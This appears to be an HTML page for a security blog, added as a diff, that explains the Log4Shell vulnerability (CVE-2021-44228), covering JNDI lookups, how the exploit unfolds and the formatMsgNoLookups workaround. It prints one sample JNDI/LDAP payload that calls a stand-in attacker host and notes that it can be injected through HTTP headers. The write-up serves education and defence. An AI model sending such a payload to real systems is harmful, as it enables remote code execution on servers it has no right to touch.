@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zero-Day Analysis: log4shell - Intelligence</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=JetBrains+Mono:wght@400;700&display=swap"
+        rel="stylesheet">
+    <script src="https://unpkg.com/@phosphor-icons/web"></script>
+    <link rel="stylesheet" href="../style.css">
+
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        bgMain: '#030712', // darker slate (gray-950)
+                        bgSec: '#020617', // slate-950
+                        textMain: '#f8fafc', // slate-50
+                        textMuted: '#94a3b8', // slate-400
+                        accentGreen: '#10b981', // Emerald tech
+                        accentTeal: '#14b8a6'
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                        mono: ['JetBrains Mono', 'monospace'],
+                    },
+                    boxShadow: {
+                        'glass': '0 4px 30px rgba(0, 0, 0, 0.5)',
+                    }
+                }
+            }
+        }
+    </script>
+</head>
+
+<body class="bg-bgMain text-textMain font-sans antialiased selection:bg-accentGreen selection:text-white">
+
+    <nav class="fixed top-0 w-full z-50 bg-bgMain/30 backdrop-blur-xl border-b border-white/5">
+        <div class="max-w-4xl mx-auto px-6 py-5 flex justify-between items-center">
+            <a href="../index.html"
+                class="font-mono text-xs text-textMuted uppercase tracking-widest hover:text-white transition-colors flex items-center">
+                <i class="ph ph-arrow-left mr-2 text-lg"></i>Return
+            </a>
+            <div class="font-mono text-xs text-white tracking-widest uppercase">Archive: <span
+                    class="text-accentGreen">#REQ-4029</span></div>
+        </div>
+    </nav>
+
+    <main class="pt-32 pb-24 px-6 md:px-0 max-w-3xl mx-auto relative z-10">
+
+        <header class="mb-16 pb-10 border-b border-white/10">
+            <div
+                class="flex items-center space-x-6 mb-8 font-mono text-[10px] text-textMuted uppercase tracking-widest">
+                <span class="text-white">Author: <span class="text-accentGreen">Admin</span></span>
+                <span class="opacity-50">/</span>
+                <span>Date: 2023-11-04</span>
+            </div>
+
+            <h1 class="text-4xl md:text-6xl font-sans font-semibold text-white mb-8 leading-tight tracking-tight">
+                Zero-Day Analysis: Unpacking log4shell</h1>
+
+            <div class="flex flex-wrap gap-3 font-mono text-[10px] uppercase tracking-widest">
+                <span class="px-4 py-2 bg-white/5 border border-white/10 text-white rounded-full">Vulnerability</span>
+                <span class="px-4 py-2 bg-white/5 border border-white/10 text-white rounded-full">Java</span>
+                <span class="px-4 py-2 bg-white/5 border border-white/10 text-white rounded-full">CVE-2021-44228</span>
+            </div>
+        </header>
+
+        <article
+            class="prose prose-invert prose-p:text-textMuted prose-headings:text-white prose-headings:font-sans prose-headings:font-medium prose-a:text-accentTeal max-w-none prose-p:font-light prose-p:leading-relaxed">
+
+            <p class="text-xl text-white/80 mb-10 leading-relaxed font-normal">
+                In late 2021, the cybersecurity landscape was fundamentally shaken by the discovery of a critical
+                vulnerability in the widely used Apache Log4j logging library. Found in thousands of enterprise
+                applications, CVE-2021-44228 allowed unauthenticated Remote Code Execution (RCE).
+            </p>
+
+            <h2 class="text-3xl mt-16 mb-6 tracking-tight">1. The Core Issue: JNDI Lookups</h2>
+            <p class="mb-8">
+                The root cause stems from Log4j's feature that allows logging configurations to evaluate variables on
+                the fly. By passing a specifically crafted string utilizing the Java Naming and Directory Interface
+                (JNDI), an attacker can force the vulnerable server to fetch and execute a malicious Java class file
+                from a remote endpoint.
+            </p>
+
+            <div class="bg-white/[0.02] border border-white/10 rounded-xl p-8 mb-8 relative group shadow-glass">
+                <div class="absolute top-0 left-0 w-full h-1 bg-accentGreen rounded-t-xl opacity-80"></div>
+                <div class="text-[10px] uppercase tracking-widest font-mono text-textMuted mb-4">Payload Example //
+                    Malicious LDAP Request</div>
+                <pre
+                    class="font-mono text-sm text-accentGreen overflow-x-auto bg-transparent p-0 m-0"><code>${jndi:ldap://attacker.com/Exploit}</code></pre>
+            </div>
+
+            <p class="mb-8">
+                When the application logs this input, the JNDI component resolves the LDAP URL, connects to
+                <code>attacker.com</code>, and retrieves the serialized payload.
+            </p>
+
+            <h2 class="text-3xl mt-16 mb-6 tracking-tight">2. Exploitation Flow</h2>
+            <ul class="list-disc list-outside ml-5 space-y-4 mb-10 text-textMuted font-light marker:text-accentGreen">
+                <li><strong class="text-white font-medium">Injection:</strong> Attacker sends input containing the
+                    payload via HTTP headers (e.g., User-Agent) or input fields.</li>
+                <li><strong class="text-white font-medium">Processing:</strong> Log4j attempts to log the string,
+                    triggering string substitution.</li>
+                <li><strong class="text-white font-medium">Lookup:</strong> The JNDI module executes an LDAP lookup to
+                    the attacker's server.</li>
+                <li><strong class="text-white font-medium">Execution:</strong> Attacker server responds with a malicious
+                    <code>.class</code> file, achieving RCE.
+                </li>
+            </ul>
+
+            <h2 class="text-3xl mt-16 mb-6 tracking-tight">3. Mitigation & Hardening</h2>
+            <p class="mb-6">Immediate remediation involved updating Log4j to a patched version. However, for systems
+                where immediate patching was impossible, several temporary workarounds were deployed:</p>
+
+            <div
+                class="bg-white/5 border-l-4 border-accentTeal p-6 mb-8 text-sm font-mono text-white/80 leading-relaxed shadow-glass">
+                # Set JVM property to disable lookups (Log4j &gt;= 2.10)<br>
+                -Dlog4j2.formatMsgNoLookups=true
+            </div>
+
+            <p class="mb-10">Ultimately, this vulnerability highlighted the dangers of implicit trust in logging
+                mechanisms and the cascading risks in the modern software supply chain.</p>
+
+        </article>
+
+        <div class="mt-20 pt-10 border-t border-white/10 flex justify-between items-center">
+            <a href="#"
+                class="text-textMuted hover:text-white font-mono text-[10px] uppercase tracking-widest transition-colors">&larr;
+                Previous Document</a>
+            <a href="#"
+                class="text-textMuted hover:text-white font-mono text-[10px] uppercase tracking-widest transition-colors">Next
+                Document &rarr;</a>
+        </div>
+    </main>
+
+    <footer class="py-10 text-center border-t border-white/5 bg-bgMain/50 backdrop-blur-md relative z-10">
+        <p class="font-mono text-[10px] text-textMuted tracking-widest uppercase">END OF FILE</p>
+    </footer>
+
+</body>
+
+</html>
